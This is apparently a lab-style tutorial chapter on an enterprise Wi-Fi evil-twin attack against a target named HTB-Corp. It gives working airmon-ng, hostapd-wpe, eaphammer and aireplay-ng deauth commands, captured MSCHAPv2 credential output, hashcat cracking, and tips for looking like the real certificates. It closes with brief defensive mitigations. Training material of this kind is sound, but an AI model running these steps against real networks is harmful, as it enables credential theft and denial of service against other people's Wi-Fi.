# Chain #28: Enterprise Evil-Twin Attack

In the previous section, we explored how to perform EAP downgrade attack to force clients into weaker authentication methods. However, if certain client devices resist downgrading to a sufficiently weak standard, we won't be able to carry out that attack. In these scenarios, when the client devices use challenge-response-based authentication methods like CHAP, MSCHAP, or MSCHAPv2, we can employ a traditional approach. This involves setting up an enterprise evil-twin attack by creating a fake access point (Rogue AP) to capture the challenge hash, which can then be leveraged for further exploitation.

> A scenario where the authenticator sends a challenge, and the supplicant (applicant) encrypts it with a password before sending it back for verification, is known as a challenge-response-based authentication method.

---

## Enumeration

We begin by enabling monitor mode on our `wlan0` interface using `airmon-ng`.

```bash
# Enable monitor mode
sudo airmon-ng start wlan0
```

```
Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

Scan target channel and list clients:

```bash
airodump-ng wlan0mon -c 1
```

```
 CH  1 ][ Elapsed: 6 s ][ 2024-08-23 09:47

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 9C:9A:03:39:BD:7A  -28 100       97        5    0   1   54   WPA2 CCMP   MGT  HTB-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 9C:9A:03:39:BD:7A  7E:0E:08:8F:6E:60  -29   12 -54      0        4
```

---

## Performing the Attack

We'll explore two ways to perform this attack. The first method involves using **hostapd-wpe**, where we manually create self-signed certificates and set up the access point. The second method utilizes the **eaphammer** tool, which automates the entire process for us.

### Using HostAPD-wpe

HostAPD-wpe is a versatile utility for attacking WPA/WPA2 Enterprise networks, handling most of the configuration for us with minimal interference. It is effective for impersonating the following EAP types:

- EAP-FAST/MSCHAPv2 (Phase 0)
    
- PEAP/MSCHAPv2
    
- EAP-TTLS/MSCHAPv2
    
- EAP-TTLS/MSCHAP
    
- EAP-TTLS/CHAP
    
- EAP-TTLS/PAP
    

Make a working copy of the config:

```bash
cp /etc/hostapd-wpe/hostapd-wpe.conf hostapd-wpe.conf
ls
# hostapd-wpe.conf
```

Edit **hostapd-wpe.conf** to match the target:

```ini
interface=wlan1
ssid=HTB-Corp
channel=1
```

List WPE options (note Cupid/Heartbleed and Karma support):

```bash
hostapd-wpe
```

```
hostapd-WPE v2.10
...
WPE options:
   -r   Return Success where possible
   -c   Cupid Mode (Heartbleed clients)
   -k   Karma Mode (Respond to all probes)
   Note: credentials logging is always enabled
```

Launch the rogue AP with Cupid + Karma:

```bash
sudo hostapd-wpe -c -k hostapd-wpe.conf
```

```
rfkill: Cannot open RFKILL control device
random: Only 15/20 bytes of strong random data available
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED
```

Monitor both real and rogue APs:

```bash
aio_dump-ng wlan0mon -c 1
```

```
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 00:11:22:33:44:00  -28 100       97        0    0   1   54   WPA2 CCMP   MGT  HTB-Corp
 9C:9A:03:39:BD:7A  -28 100       97        5    0   1   54   WPA2 CCMP   MGT  HTB-Corp
```

If clients stick to the real AP, force roam with deauth:

```bash
sudo aireplay-ng -0 10 -a 9C:9A:03:39:BD:7A -c 7E:0E:08:8F:6E:60 wlan0mon
```

Example capture from **hostapd-wpe** (MSCHAPv2 challenge/response):

```
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.11: authenticated
wlan1: STA 7e:0e:08:8f:6e:60 IEEE 802.11: associated (aid 1)
...
mschapv2: Wed Aug 21 12:52:31 2024
	 username:		HTB-NET\Administrator
	 challenge:		45:14:53:22:49:08:8c:58
	 response:		10:51:1c:55:42:d6:04:1d:b2:2a:d6:29:73:ad:76:0c:6f:f5:07:d3:3a:dd:6d:b3
	 jtr NETNTLM:		Administrator:$NETNTLM$as65a4sd564d1a2s$54as56d65asasd55asd564asd564asd555asd564as6d55s5
	 hashcat NETNTLM:	Administrator::::54as56d65asasd55asd564asd564asd555asd564as6d55s5:as65a4sd564d1a2s
```

> Since this is _not_ a negotiated downgrade to GTC/TTLS-PAP, you typically won’t get cleartext passwords—plan to crack the MSCHAPv2 material.

### Using Eaphammer

Create self-signed certs:

```bash
/opt/eaphammer/eaphammer --cert-wizard
```

Start a rogue WPA-EAP AP:

```bash
/opt/eaphammer/eaphammer -i wlan1 -e HTB-Corp --auth wpa-eap --wpa-version 2
```

```
[hostapd] AP starting...
wlan1: AP-ENABLED
```

Force roam if needed:

```bash
sudo aireplay-ng -0 10 -a 9C:9A:03:39:BD:7A -c 7E:0E:08:8F:6E:60 wlan0mon
```

Example loot (NETNTLM/MSCHAPv2 material):

```
mschapv2: Sat Aug 24 20:07:21 2024
	 domain\username:	HTB-NET\Administrator
	 username:	    	Administrator
	 challenge:	    	45:14:53:22:49:08:8c:58
	 response:	    	10:51:1c:55:42:d6:04:1d:b2:2a:d6:29:73:ad:76:0c:6f:f5:07:d3:3a:dd:6d:b3
	 jtr NETNTLM:		Administrator:$NETNTLM$as65a4sd564d1a2s$54as56d65asasd55asd564asd564asd555asd564as6d55s5
	 hashcat NETNTLM:	Administrator::::54as56d65asasd55asd564asd564asd555asd564as6d55s5:as65a4sd564d1a2s
```

---

## Cracking the Hash

Pick a candidate wordlist (e.g., **rockyou** or custom corp lists) and crack the NETNTLM/NTLMv1 material with Hashcat.

```bash
hashcat -m 5500 -a 0 'HTB-NET\Administrator::::54as56d65asasd55asd564asd564asd555asd564as6d55s5:as65a4sd564d1a2s' wordlist.dict
```

Sample cracked output:

```
HTB-NET\Administrator::::54as56d65asasd55asd564asd564asd555asd564as6d55s5:as65a4sd564d1a2s:Wowwhatasecurepassword123
Status...........: Cracked
Hash.Mode........: 5500 (NetNTLMv1 / NetNTLMv1+ESS)
```

If cracking fails (strong password policy), consider a **PEAP relay**: relay captured NTLM to the real AP to obtain a live session without knowing the plaintext.

---

## Notes & Tips

- Karma/rogue AP beacons help clients discover the fake AP, but placement and RF conditions matter; be close to targets.
    
- Use DN fields (CN/O/OU, etc.) that closely mimic the real certs to reduce user prompts and suspicion.
    
- Some clients enforce server cert pinning/validation; downgrades may fail and only MSCHAPv2 loot will be possible.
    
- Prefer GPU cracking for speed; try rules-based and mask attacks after dictionary passes.
    
- Blue-team mitigations: enforce server certificate validation, use EAP-TLS with client certs, disable PEAP/MSCHAPv2, enable 802.11w PMF, and monitor for rogue SSIDs.